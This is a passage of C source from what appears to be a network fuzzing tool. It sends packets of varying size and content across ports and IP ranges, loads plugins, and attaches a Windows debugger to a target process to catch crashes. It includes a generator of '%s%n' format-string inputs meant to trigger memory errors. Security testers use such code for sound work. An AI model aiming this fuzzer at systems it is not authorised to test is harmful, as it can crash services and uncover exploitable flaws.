        if(port_scan) peer.sin_port = htons(++port);
        if(port > 65535) break;
        if(upsize > 0) {    // increase
            if(sendsize >= size) break;
            sendsize += upsize;
        }
        if(upsize < 0) {    // decrease
            if(sendsize <= x_start) break;
            sendsize += upsize; // + because upsize is negative
        }
        if(Xbits && !Xrandom) {
            if(Xmagic) {
                Xnumber += Xmagic;
            } else {
                Xnumber++;
            }
            if(Xnumber > Xmaxnumber) {  // NOT >=
                if(!Xmagic) break;
                Xnumber &= 0xff;    //Xnumber = 0;
                Xoffset++;
                // why? because I want that also the last byte gets scanned :)
                //if((Xoffset + (Xbits / 8)) > size) break;
                if(Xoffset > size) break;
            }
        }
        if(!upsize && (randbyte == 2)) { // sequential
            if(chr_data) {
                for(i = 0; i < chr_datasz; i++) {
                    chr_data[i]++;
                }
            } else {
                if(chr_bck == -1) {
                    if(chr > 0xff) break;
                } else {
                    if((chr & 0xff) == chr_bck) break;
                }
            }
        }
        if(randbyte == 2) {
            if(chr_data) {
            } else {
                if((chr_bck >= 0) && (chr_bck <= 0xff)) chr &= 0xff;
            }
        }

        sleepms(loopms);    // do it even if zero to limit congestion

        if(randport || (pck_proto < 0)) {
            if(!tcp_max1) CLOSE_SD(sd);
        }

    }
    if(content && content[content_n].data) {
        content_n++;
        if(content[content_n].data) goto redo;
    }

    CLOSE_SD(sd);
    if(zbits) inflateEnd(&z);
    if(sendbuff && (sendbuff != buff)) free(sendbuff);
    if(buff) free(buff);
    if(hLib)  CLOSEDLL
    if(debug && tid) {
        printf("\n- wait the detaching of the debugger\n");
        debug = 0;
        quick_threadz(tid);
    }
    printf("\n- finished\n");
    return(0);
}



int debug_privileges(void)  {
#ifdef WIN32
    TOKEN_PRIVILEGES tp;
    HANDLE  hp;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hp)) return(-1);
    memset(&tp, 0, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) return FALSE;
    if(!AdjustTokenPrivileges(hp, FALSE, &tp, sizeof(tp), NULL, NULL)) return(-1);
    CloseHandle(hp);
#endif
    return(0);
}



u32 *get_hosts(u8 *str) {
    u32     *ret    = NULL;
    int     i,
            n,
            a       = 0,
            b       = 0,
            c       = 0,
            d       = 0,
            x       = 0,
            hosts   = 0;
    u8      tmp[16] = "",
            *l;

    for(;;) {
        l = strchr(str, ',');
        if(l) *l = 0;

        i = sscanf(str, "%d.%d.%d.%d%c", &a, &b, &c, &d, tmp);
        if(i == 3) {        // class B
            sscanf(str, "%d.%d.%d-%d", &a, &b, &c, &x);
            a &= 0xff;
            b &= 0xff;
            c &= 0xff;
            d &= 0xff;
            x &= 0xff;
            if(x < c) {
                //x = 255;
                fprintf(stderr, "\nError: you inserted a wrong IP range to scan (%s)\n", str);
                exit(1);
            }
            n = ((x - c) + 1) * 256;
            ret = realloc(ret, (hosts + n) * sizeof(u32));
            if(!ret) std_err();
            d = 1;  // 0 and 255 should be skipped, 0 for sure
            for(i = 0; i < n; i++) {
                if(d > 255) {
                    d = 0;
                    c++;
                }
                if(c > x) break;
                ret[hosts++] = a | (b << 8) | (c << 16) | (d << 24);
                d++;
            }

        } else if(i == 5) { // class C
            sscanf(str, "%d.%d.%d.%d-%d", &a, &b, &c, &d, &x);
            a &= 0xff;
            b &= 0xff;
            c &= 0xff;
            d &= 0xff;
            x &= 0xff;
            if(x < d) {
                //x = 255;
                fprintf(stderr, "\nError: you inserted a wrong IP range to scan (%s)\n", str);
                exit(1);
            }
            n = (x - d) + 1;
            ret = realloc(ret, (hosts + n) * sizeof(u32));
            if(!ret) std_err();
            for(i = 0; i < n; i++) {
                if(d > x) break;
                ret[hosts++] = a | (b << 8) | (c << 16) | (d << 24);
                d++;
            }

        } else {
            ret = realloc(ret, (hosts + 1) * sizeof(u32));
            if(!ret) std_err();
            ret[hosts++] = resolv(str);
        }

        if(!l) break;
        str = l + 1;
    }

    if(ret) {
        ret = realloc(ret, (hosts + 1) * sizeof(u32));
        if(!ret) std_err();
        ret[hosts] = 0;
    }
    return(ret);
}



u8 *process_list(u8 *myname, DWORD *mypid, DWORD *size) {
#ifdef WIN32
    PROCESSENTRY32  Process;
    MODULEENTRY32   Module;
    HANDLE          snapProcess,
                    snapModule;
    DWORD           retpid = 0;
    int             len;
    BOOL            b;
    u8              tmpbuff[60],
                    *process_name,
                    *module_name,
                    *module_print,
                    *tmp;

    if(mypid) retpid = *mypid;
    if(!myname && !retpid) {
        printf(
            "  pid/addr/size       process/module name\n"
            "  ---------------------------------------\n");
    }

#define START(X,Y) \
            snap##X = CreateToolhelp32Snapshot(Y, Process.th32ProcessID); \
            X.dwSize = sizeof(X); \
            for(b = X##32First(snap##X, &X); b; b = X##32Next(snap##X, &X)) { \
                X.dwSize = sizeof(X);
#define END(X) \
            } \
            CloseHandle(snap##X);

    Process.th32ProcessID = 0;
    START(Process, TH32CS_SNAPPROCESS)
        process_name = Process.szExeFile;

        if(!myname && !retpid) {
            printf("  %-10lu ******** %s\n",
                Process.th32ProcessID,
                process_name);
        }
        if(myname && stristr(process_name, myname)) {
            retpid = Process.th32ProcessID;
        }

        START(Module, TH32CS_SNAPMODULE)
            module_name = Module.szExePath; // szModule?

            len = strlen(module_name);
            if(len >= 60) {
                tmp = strrchr(module_name, '\\');
                if(!tmp) tmp = strrchr(module_name, '/');
                if(!tmp) tmp = module_name;
                len -= (tmp - module_name);
                sprintf(tmpbuff,
                    "%.*s...%s",
                    54 - len,
                    module_name,
                    tmp);
                module_print = tmpbuff;
            } else {
                module_print = module_name;
            }

            if(!myname && !retpid) {
                printf("    %p %08lx %s\n",
                    Module.modBaseAddr,
                    Module.modBaseSize,
                    module_print);
            }
            if(!retpid) {
                if(myname && stristr(module_name, myname)) {
                    retpid = Process.th32ProcessID;
                }
            }
            if(retpid && mypid && (Process.th32ProcessID == retpid)) {
                printf("- %p %08lx %s\n",
                    Module.modBaseAddr,
                    Module.modBaseSize,
                    module_print);
                *mypid = retpid;
                if(size) *size = Module.modBaseSize;
                return(Module.modBaseAddr);
            }

        END(Module)

    END(Process)

#undef START
#undef END

#else

    //system("ps -eo pid,cmd");
    printf("\n"
        "- use ps to know the pids of your processes, like:\n"
        "  ps -eo pid,cmd\n");

#endif

    return(NULL);
}



DWORD get_pid(u8 *str) {
    DWORD   pid;
    u8      *baddr;

    if(!str) return(0);
    if((str[0] >= '0') && (str[0] <= '9')) return(atoi(str));
    baddr = process_list(str, &pid, NULL);
    if(!baddr) {
        fprintf(stderr, "\nError: process name/PID not found, use -p\n");
        exit(1);
    }
    return(pid);
}



#ifdef WIN32
static BOOL WINAPI (*_DebugSetProcessKillOnExit)(BOOL) = NULL;
static BOOL WINAPI (*_DebugActiveProcessStop)(DWORD) = NULL;
int debug_missing(void) {
    static HMODULE kernel32 = NULL;

    if(!kernel32) kernel32 = LoadLibrary("kernel32.dll");
    if(kernel32) {
        if(!_DebugSetProcessKillOnExit)
            _DebugSetProcessKillOnExit = (void *)GetProcAddress(kernel32, "DebugSetProcessKillOnExit");
        if(!_DebugActiveProcessStop)
            _DebugActiveProcessStop = (void *)GetProcAddress(kernel32, "DebugActiveProcessStop");
        if(_DebugSetProcessKillOnExit && _DebugActiveProcessStop) return(0);
    }
    return(-1);
}



u8 *show_exception(DWORD status) {
    static u8   tmp[32];
    u8          *ret = "";

    switch(status) {
        case STATUS_ACCESS_VIOLATION:           ret = "ACCESS_VIOLATION"; break;
        case STATUS_IN_PAGE_ERROR:              ret = "IN_PAGE_ERROR"; break;
        case STATUS_INVALID_HANDLE:             ret = "INVALID_HANDLE"; break;
        case STATUS_NO_MEMORY:                  ret = "NO_MEMORY"; break;
        case STATUS_ILLEGAL_INSTRUCTION:        ret = "ILLEGAL_INSTRUCTION"; break;
        case STATUS_NONCONTINUABLE_EXCEPTION:   ret = "NONCONTINUABLE_EXCEPTION"; break;
        case STATUS_INVALID_DISPOSITION:        ret = "INVALID_DISPOSITION"; break;
        case STATUS_ARRAY_BOUNDS_EXCEEDED:      ret = "ARRAY_BOUNDS_EXCEEDED"; break;
        case STATUS_FLOAT_DENORMAL_OPERAND:     ret = "FLOAT_DENORMAL_OPERAND"; break;
        case STATUS_FLOAT_DIVIDE_BY_ZERO:       ret = "FLOAT_DIVIDE_BY_ZERO"; break;
        case STATUS_FLOAT_INEXACT_RESULT:       ret = "FLOAT_INEXACT_RESULT"; break;
        case STATUS_FLOAT_INVALID_OPERATION:    ret = "FLOAT_INVALID_OPERATION"; break;
        case STATUS_FLOAT_OVERFLOW:             ret = "FLOAT_OVERFLOW"; break;
        case STATUS_FLOAT_STACK_CHECK:          ret = "FLOAT_STACK_CHECK"; break;
        case STATUS_FLOAT_UNDERFLOW:            ret = "FLOAT_UNDERFLOW"; break;
        case STATUS_INTEGER_DIVIDE_BY_ZERO:     ret = "INTEGER_DIVIDE_BY_ZERO"; break;
        case STATUS_INTEGER_OVERFLOW:           ret = "INTEGER_OVERFLOW"; break;
        case STATUS_PRIVILEGED_INSTRUCTION:     ret = "PRIVILEGED_INSTRUCTION"; break;
        case STATUS_STACK_OVERFLOW:             ret = "STACK_OVERFLOW"; break;
        case STATUS_CONTROL_C_EXIT:             ret = "CONTROL_C_EXIT"; break;
        //case STATUS_DLL_INIT_FAILED:            ret = "DLL_INIT_FAILED"; break;
        //case STATUS_DLL_INIT_FAILED_LOGOFF:     ret = "DLL_INIT_FAILED_LOGOFF"; break;
        default: {
            sprintf(tmp, "%08x", (int)status);
            ret = tmp;
            break;
        }
    }
    return(ret);
}



// the debugging stuff must be handled by the same thread or will not work
quick_thread(debugger, int pid) {
    DEBUG_EVENT *dbg = NULL;
    int     i,
            dbg_do;

    if(!pid) return(0);

    for(i = 5; i >= 0; i--) {
        if(DebugActiveProcess(pid)) break;
        Sleep(ONESEC);
    }
    if(i < 0) goto quit; //winerr();
    printf("- debugger attached to pid %d\n", (int)pid);

    dbg = calloc(1, sizeof(DEBUG_EVENT));
    while(debug) {
        if(!WaitForDebugEvent(dbg, 500)) continue;
        dbg_do = DBG_CONTINUE;
        if(dbg->dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
            if((dbg->u.Exception.ExceptionRecord.ExceptionCode & 0xff000000) == 0xc0000000) {
                // dbg->u.Exception.dwFirstChance not handled to catch also the non critical errors
                printf("\n\nDEBUG exception: %08x %s:",
                    (int)dbg->u.Exception.ExceptionRecord.ExceptionAddress,
                    show_exception(dbg->u.Exception.ExceptionRecord.ExceptionCode));
                for(i = 0; i < dbg->u.Exception.ExceptionRecord.NumberParameters; i++) {
                    printf(" %08x", (int)dbg->u.Exception.ExceptionRecord.ExceptionInformation[i]);
                }
                printf("\n");
            }
            dbg_do = DBG_EXCEPTION_NOT_HANDLED;

        } else if(dbg->dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
            printf("\n\nDEBUG exit: %08x\n\n",
                (int)dbg->u.ExitProcess.dwExitCode);
            break;

        } else if(dbg->dwDebugEventCode == RIP_EVENT) {
            printf("\n\nDEBUG rip: %08x %08x\n\n",
                (int)dbg->u.RipInfo.dwError,
                (int)dbg->u.RipInfo.dwType);
            break;
        }
        if(!ContinueDebugEvent(dbg->dwProcessId, dbg->dwThreadId, dbg_do)) break;
    }
quit:
    debug_missing();
    _DebugActiveProcessStop(pid);
    printf("- debugger detached\n");
    free(dbg);
    debug = 0;
    return(0);
}
#else
quick_thread(debugger, int pid) {
    return(0);
}
#endif



void show_dump(unsigned char *data, unsigned int len, FILE *stream) {
    int                 t,
                        rem,
                        left = 2 + 8 + 2;
    static const char   hex[16] = "0123456789abcdef";
    unsigned char       leftbuff[80],
                        buff[67],
                        chr,
                        *bytes,
                        *p,
                        *limit,
                        *glimit = data + len,
                        *base_data = data;

    memset(buff + 2, ' ', 48);
    memset(leftbuff, ' ', sizeof(leftbuff));

    while(data < glimit) {
        t = sprintf(leftbuff, "  %08x ", data - base_data);
        leftbuff[t] = ' ';

        limit = data + 16;
        if(limit > glimit) {
            limit = glimit;
            memset(buff, ' ', 48);
        }

        p     = buff;
        bytes = p + 50;
        while(data < limit) {
            chr = *data;
            *p++ = hex[chr >> 4];
            *p++ = hex[chr & 15];
            p++;
            *bytes++ = ((chr < ' ') || (chr >= 0x7f)) ? '.' : chr;
            data++;
        }
        *bytes++ = '\n';

        for(rem = left; rem >= (int)sizeof(leftbuff); rem -= sizeof(leftbuff)) {
            fwrite(leftbuff, sizeof(leftbuff), 1, stream);
        }
        if(rem > 0) fwrite(leftbuff, rem, 1, stream);
        fwrite(buff, bytes - buff, 1, stream);
    }
}



void loaddll(u8 *fname, u8 *par) {
    if(!fname) return;

    if(!quiet) printf("- load library %s\n", fname);

    if(strchr(fname, ',')) {
        fprintf(stderr, "\nError: you must use another -L option if you want to use multiple libraries\n");
        exit(1);
    }

    if(plugins >= MAX_PLUGINS) {
        fprintf(stderr, "\nError: you can't use additional plugins\n");
        exit(1);
    }
    LOADDLL
    GETFUNC(plugin[plugins].sudp_init,  "sudp_init")
    GETFUNC(plugin[plugins].sudp_pck,   "sudp_pck")
    GETFUNC(plugin[plugins].mysend,     "mysend")
    GETFUNC(plugin[plugins].mysendto,   "mysendto")
    GETFUNC(plugin[plugins].myrecv,     "myrecv")
    GETFUNC(plugin[plugins].myrecvfrom, "myrecvfrom")

    if(plugin[plugins].sudp_init && par && plugin[plugins].sudp_init(par)) {
        fprintf(stderr, "\nError: plugin initialization failed\n\n");
        CLOSEDLL
        exit(1);
    }
    plugins++;
}



void load_content(u8 *filename, int type, int offset) {
#define LOAD_CONTENT_DOIT { \
                    data = load_xstring(p, type, &size); \
                    content[contents + i].offset = offset; \
                    content[contents + i].data   = data; \
                    content[contents + i].size   = size; \
                }
    int     i,
            size,
            doit,
            contents    = 0;
    u8      *data,
            *p,
            *l;

    if(!filename) return;
    if(content) {
        for(i = 0; content[i].data; i++);
        contents = i;
    }

    if(type < 0) {  // file
        for(doit = 0; doit < 2; doit++) {
            i = 0;
            for(p = filename; p && *p; p = l + 1) {
                l = strchr(p, ',');
                if(!l) l = strchr(p, ';');
                if(!l) l = strchr(p, '|');
                if(doit) {
                    if(l) *l = 0;
                    LOAD_CONTENT_DOIT
                }
                i++;
                if(!l) break;
            }
            if(!doit && i) {
                content = realloc(content, (contents + i + 1) * sizeof(content_t));
                if(!content) std_err();
            }
        }
    } else {
        i = 1;
        content = realloc(content, (contents + i + 1) * sizeof(content_t));
        if(!content) std_err();
        i = 0;
        p = filename;
        LOAD_CONTENT_DOIT
        i++;
    }
    content[contents + i].offset = MYMAXINT;
    content[contents + i].data   = NULL;
    content[contents + i].size   = 0;
}



void lamemset(u8 *data, int chr, int size, int chr_bits) {
    int     i;

    if(chr == -1) { // format string... bad boy :)
        for(i = 0; i < size; i++) {
            if(i & 1) {
                if((i % 11) == 2) data[i] = 'n';
                else data[i] = 's';
            } else {
                data[i] = '%';
            }
        }
    //} else if((chr >= 0) && (chr <= 0xff)) {
    } else if(chr_bits == 8) {
        memset(data, chr, size);
    } else if(chr_bits == 16) {
        for(i = 0; (i + 2) <= size; i += 2) {
            putxx(data + i, chr, 16, LITTLE_ENDIAN);
        }
        memset(data + i, chr, size - i);
    } else {
        for(i = 0; (i + 4) <= size; i += 4) {
            putxx(data + i, chr, 32, LITTLE_ENDIAN);
        }
        memset(data + i, chr, size - i);
    }
}



int myisalnum(int chr) {
    if((chr >= '0') && (chr <= '9')) return(1);
    if((chr >= 'a') && (chr <= 'z')) return(1);
    if((chr >= 'A') && (chr <= 'Z')) return(1);
    if(chr == '-') return(1);   // negative number
    //if(chr == '+') return(1);   // positive number
    return(0);
}



// alternative to sscanf so it's possible to use also commas and hex numbers
int get_parameter_numbers(u8 *s, int max_parameters, ...) {
    va_list ap;
    int     i,
            *par;

    // do NOT reset the parameters because they could have default values different than 0!

    if(!s) return(0);
    va_start(ap, max_parameters);
    for(i = 0; i < max_parameters; i++) {
        par = va_arg(ap, int *);

        while(*s && !myisalnum(*s)) s++;
        if(!*s) break;
        *par = myatoi(s);
        while(*s && myisalnum(*s)) s++;
        if(!*s) break;
    }
    va_end(ap);
    return(i);
}



void myhash(int hash_algo, u8 *out, u8 *in, int insz) {
    static int  init = 0;
    u32     crc,
            *p32;
    u8      tmp[32];

    if(insz < 0) return;    // insz equal to zero has a valid CRC and hash!
    switch(hash_algo) {
        case HASH_MD5: {
            if((out > in) && ((out + 16) <= (in + insz))) memset(out, 0, 16);
            md5(in, insz, out);
            break;
        }
        case HASH_MD5_4: {
            if((out > in) && ((out + 4) <= (in + insz))) memset(out, 0, 4);
            md5(in, insz, tmp);
            p32 = (u32 *)tmp;
            putxx(out, p32[0] ^ p32[1] ^ p32[2] ^ p32[3], 32, Xendian);
            break;
        }
        case HASH_CRC32: {
            if((out > in) && ((out + 4) <= (in + insz))) memset(out, 0, 4);
            if(!init) make_crctable(crc_ctx.table, crc_ctx.poly, crc_ctx.size, crc_ctx.rever);
            crc = calc_crc(&crc_ctx, in, insz);
            putxx(out, crc, 32, Xendian);
            break;
        }
        case HASH_CRC16: {
            if((out > in) && ((out + 2) <= (in + insz))) memset(out, 0, 2);
            if(!init) make_crctable(crc_ctx.table, crc_ctx.poly, crc_ctx.size, crc_ctx.rever);
            crc = calc_crc(&crc_ctx, in, insz);
            putxx(out, crc, 16, Xendian);
            break;
        }
        default: break;
    }
    if(!init) init = 1;
}



int get_hash(u8 *str) {
    if(!stricmp(str, "md5"))        return(HASH_MD5);
    if(!stricmp(str, "md5_4"))      return(HASH_MD5_4);
    if(!stricmp(str, "md5_32"))     return(HASH_MD5_4);
    if(!stricmp(str, "crc"))        return(HASH_CRC32); // poly is already default
    if(!stricmp(str, "crc32"))      return(HASH_CRC32);
    if(!stricmp(str, "checksum"))   return(HASH_CRC32);
    if(!stricmp(str, "crc16")) {
        crc_ctx.poly = 0x8005;
        return(HASH_CRC16);
    }
    fprintf(stderr, "\nError: unsupported hash algorithm (%s)\n", str);
    exit(1);
    return(-1);
}



u32 randit(u32 *rnd) {
    *rnd = (*rnd * 0x343FD) + 0x269EC3;
    *rnd = ~((*rnd >> 1) - 1);  // *rnd >>= 1 was enough
    return(*rnd);
}



int recvshow(int sd, int pck_proto, int dumprecv) {
    struct sockaddr_in  peerl;
    static u8   *buff = NULL;
    int     i,
            t,
            psz,
            len,
            pck;

    if(dumprecv == -3) {
        // wait forever
    } else if(dumprecv == -4) {
        // wait forever
    } else {
        if(timeout(sd, 1) < 0) return(-1);
    }

    if(!buff) {
        buff = malloc(0xffff + 1);
        if(!buff) std_err();
    }

    len = -1;
    for(pck = 0;; pck++) {
        memset(&peerl, 0, sizeof(struct sockaddr_in));
        psz = sizeof(struct sockaddr_in);
        if(pck_proto < 0) {
            len = recv(sd, buff, 0xffff, 0);
        } else {
            len = recvfrom(sd, buff, 0xffff, 0, (struct sockaddr *)&peerl, &psz);
        }
        if(len >= 0) {
        if(plugins/* && (total_pcks >= dllwhen)*/) {
            buff[len] = 0;  // in case of bad plugins
            for(i = 0; i < plugins; i++) {
                if(plugin[i].sudp_pck) len = plugin[i].sudp_pck(buff, len); // packets modification
                if(plugin[i].myrecvfrom || plugin[i].myrecv) {
                    if(plugin[i].myrecvfrom) {
                        len = plugin[i].myrecvfrom(sd, buff, len, 0, (struct sockaddr *)&peerl, &psz);
                    } else {
                        len = plugin[i].myrecv(sd, buff, len, 0);
                    }
                }
            }
        }
        }
        if(!len) {
            if(pck_proto < 0) return(-2);
            break;
        }
        if(len < 0) return(-1);

        t = len;
        if((dumprecv > 0) && (t > dumprecv)) t = dumprecv;
        fputc('\n', stdout);
        show_dump(buff, t, stdout);
        if(dumprecv == -1) {
            if(timeout(sd, 1) < 0) break;
        } else if(dumprecv == -3) {
            // none, wait forever
        } else if(dumprecv == -4) {
            break;  // wait only the first packet
        } else {
            if(timeout(sd, 0) < 0) break;
        }
    }
    return(len);
}



u8 *load_file(u8 *filename, int *contentsize) {
    struct  stat    xstat;
    int     len;
    FILE    *fd;
    u8      *buff;

    if(!quiet) printf("- load file:    %s\n", filename);
    if(!strcmp(filename, "-")) {
        fd = stdin;
    } else {
        fd = fopen(filename, "rb");
        if(!fd) std_err();
    }

    if(fd == stdin) {
        len = 0xffff;
    } else {
        fstat(fileno(fd), &xstat);
        len = xstat.st_size;
    }
    buff = malloc(len);
    if(!buff) std_err();
    len = fread(buff, 1, len, fd);
    if(fd != stdin) fclose(fd);
    if(contentsize) *contentsize = len;
    return(buff);
}



int cstring(u8 *input, u8 *output, int maxchars, int *inlen) {
    int     n,
            len;
    u8      *p,
            *o;

    if(!input || !output) {
        if(inlen) *inlen = 0;
        return(0);
    }

    p = input;
    o = output;
    while(*p) {
        if(maxchars >= 0) {
            if((o - output) >= maxchars) break;
        }
        if(*p == '\\') {
            p++;
            switch(*p) {
                case 0:  return(-1); break;
                //case '0':  n = '\0'; break;
                case 'a':  n = '\a'; break;
                case 'b':  n = '\b'; break;
                case 'e':  n = '\e'; break;
                case 'f':  n = '\f'; break;
                case 'n':  n = '\n'; break;
                case 'r':  n = '\r'; break;
                case 't':  n = '\t'; break;
                case 'v':  n = '\v'; break;
                case '\"': n = '\"'; break;
                case '\'': n = '\''; break;
                case '\\': n = '\\'; break;
                case '?':  n = '\?'; break;
                case '.':  n = '.';  break;
                case ' ':  n = ' ';  break;
                case 'x': {
                    //n = readbase(p + 1, 16, &len);
                    //if(len <= 0) return(-1);
                    if(sscanf(p + 1, "%02x%n", &n, &len) != 1) return(-1);
                    if(len > 2) len = 2;
                    p += len;
                    } break;
                default: {
                    //n = readbase(p, 8, &len);
                    //if(len <= 0) return(-1);
                    if(sscanf(p, "%3o%n", &n, &len) != 1) return(-1);
                    if(len > 3) len = 3;
                    p += (len - 1); // work-around for the subsequent p++;
                    } break;
            }
            *o++ = n;
        } else {
            *o++ = *p;
        }
        p++;
    }
    *o = 0;
    len = o - output;
    if(inlen) *inlen = p - input;
    return(len);
}



int hex2byte(u8 *hex) {
    static const u8 hextable[256] =
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\xff\xff\xff\xff\xff\xff"
        "\xff\x0a\x0b\x0c\x0d\x0e\x0f\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\x0a\x0b\x0c\x0d\x0e\x0f\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";

    if(hextable[hex[0]] > 15) return(-1);
    if(hextable[hex[1]] > 15) return(-1);
    return((hextable[hex[0]] << 4) | hextable[hex[1]]);
}



u8 *load_xstring(u8 *input, int hex, int *contentsize) {
    int     i,
            c,
            len;
    u8      *buff,
            *p;

    if(hex < 0) {
        return(load_file(input, contentsize));
    }

    len = strlen(input);
    buff = malloc(len + 1);
    if(!buff) std_err();

    if(hex) {
        p = buff;
        for(i = 0; i < len; i++) {
            c = hex2byte(input + i);
            if(c < 0) continue;
            *p++ = c;
            i++;    // +2
        }
        len = p - buff;
    } else {
        len = cstring(input, buff, len, NULL);
    }
    if(contentsize) *contentsize = len;
    return(buff);
}



int create_socket(int pck_proto, int sd_already_set, struct sockaddr_in *peer) {
    static int  first_time  = 1;
    static int  size        = 0xffff;
    int     sd  = -1;

    for(;;) {
        if(sd_already_set <= 0) {
            for(;;) {
                if(pck_proto < 0) {
                    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                } else if(!pck_proto) {
                    sd = socket(AF_INET, SOCK_DGRAM,  IPPROTO_UDP);
                } else {
                    sd = socket(AF_INET, SOCK_RAW,    IPPROTO_RAW);
                }
                if(sd > 0) break;
                sleepms(500);
            }
        } else {
            sd = sd_already_set;
        }
        // SO_LINGER makes the sending a bit slower because it really sends
        // the whole full data and it's sure almost at 100% that it's received
        setsockopt(sd, SOL_SOCKET, SO_LINGER,    (char *)&ling, sizeof(ling));
        setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on,   sizeof(on));
        setsockopt(sd, SOL_SOCKET, SO_SNDBUF,    (char *)&size, sizeof(size));  // useless
        if(pck_proto >= 0) break;   // packets

        setsockopt(sd, IPPROTO_TCP, TCP_NODELAY, (char *)&on,   sizeof(on));
        if(!peer) break;
        if(peer->sin_addr.s_addr == INADDR_NONE) break;
        if(peer->sin_addr.s_addr == INADDR_ANY) break;
        if(!connect(sd, (struct sockaddr *)peer, sizeof(struct sockaddr_in))) {
            if(first_time) first_time = 0;
            break;
        }
        if(first_time) std_err();
        close(sd);
        sd_already_set = -1;
        sleepms(500);
    }
    return(sd);
}



u8 *get_byte(u8 *data, int *ret_chr, int *ret_chr_bits) {
    int     chr,
            len;
    u8      *ret    = NULL;

    len = strlen(data);
    *ret_chr = 0;
    *ret_chr_bits = 8;
    if(len < 1)  {
        *ret_chr = 0;
    } else if(len == 1) {
        *ret_chr = data[0];
    } else if(data[0] == '-') {
        *ret_chr = atoi(data);  // negative for the format string test
    } else if(len <= 10) {      // 0x00000000
        if((data[0] == '0') && (tolower(data[1]) == 'x')) data += 2;
        if(sscanf(data, "%x", &chr) == 1) {
            *ret_chr = chr;
            *ret_chr_bits = strlen(data) * 4;
            if(*ret_chr_bits < 8)  *ret_chr_bits = 8;
            else if(*ret_chr_bits > 32) *ret_chr_bits = 32;
            else if(*ret_chr_bits > 16) *ret_chr_bits = 32;
            else if(*ret_chr_bits > 8)  *ret_chr_bits = 16;
        } else {
            goto string_failsafe;
        }
    } else {    // experimental string
        goto string_failsafe;
    }
    return(ret);
string_failsafe:
    ret = strdup(data);
    *ret_chr = cstring(ret, ret, -1, NULL);
    return(ret);
}



int get_num(u8 *data) {
    int     op      = 0,
            num     = 0,
            sign    = 1,
            tot     = 0,
            t;

    while(data[0]) {
        while(data[0] && (data[0] <= ' ')) data++;
        if(!data[0]) break;
        if(strchr("+-*/%^|&<>~!", data[0])) {
            op = data[0];
            data++;
        }
        while(data[0] && (data[0] <= ' ')) data++;
        if(!data[0]) break;

        sign = 1;
        if(op == '-') sign = -1;
        /*
        if(data[0] == '-') {
            sign = -1;
            data++;
        }
        */

        num = 0;
        t = 0;
        if((strlen(data) > 1) && (tolower(data[1]) == 'x')) {
            data += 2;
            sscanf(data, "%x%n", &num, &t);
        } else if((data[0] == '$') || (data[0] == '#')) {
            data++;
            sscanf(data, "%x%n", &num, &t);
        } else if(sign < 0) {
            if(!((data[0] >= '0') && (data[0] <= '9'))) {
                if(data[0] != 'l') {    // yeah l and 1 are very similar
                    fprintf(stderr, "\n"
                        "Error: recheck your options because seems that some arguments are wrong\n"
                        "       for example \"%s\" should be a number\n", data);
                    exit(1);
                }
            }
            sscanf(data, "%i%n", &num, &t);
        } else {
            sscanf(data, "%u%n", &num, &t);
        }
        if(t <= 0) t = 1;
        data += t;

        //if(sign < 0) num = -num;

             if(op == '+') tot += num;
        else if(op == '-') tot -= num;
        else if(op == '*') tot *= num;
        else if(op == '/') tot /= num;
        else if(op == '%') tot %= num;
        else if(op == '^') tot ^= num;
        else if(op == '|') tot |= num;
        else if(op == '&') tot &= num;
        else if(op == '<') tot <<= num;
        else if(op == '>') tot >>= num;
        else if(op == '~') tot = ~num;
        else if(op == '!') tot = !num;
        else               tot = num;
        op = 0;
    }
    return(tot);
}



int create_rand_byte(u8 *data, int len, u32 *seed) {
    u32     rnd;
    u8      *p;

    rnd = *seed;
    p   = data;
    while(len--) {
        *p++ = randit(&rnd);
    }
    *seed = rnd;
    return(p - data);
}



int putxx(u8 *data, u32 num, int bits, int endian) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        if(endian == BIG_ENDIAN) {
            data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
        } else {
            data[i] = (num >> (i << 3)) & 0xff;
        }
    }
    return(bytes);
}



int zip(z_stream *z, u8 *in, u32 insz, u8 *out, u32 outsz) {
    deflateReset(z);

    z->next_in   = in;
    z->avail_in  = insz;
    z->next_out  = out;
    z->avail_out = outsz;
    if(deflate(z, Z_FINISH) != Z_STREAM_END) {
        fprintf(stderr, "\nError: the compressed output is wrong or incomplete\n");
        exit(1);
    }
    return(z->total_out);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
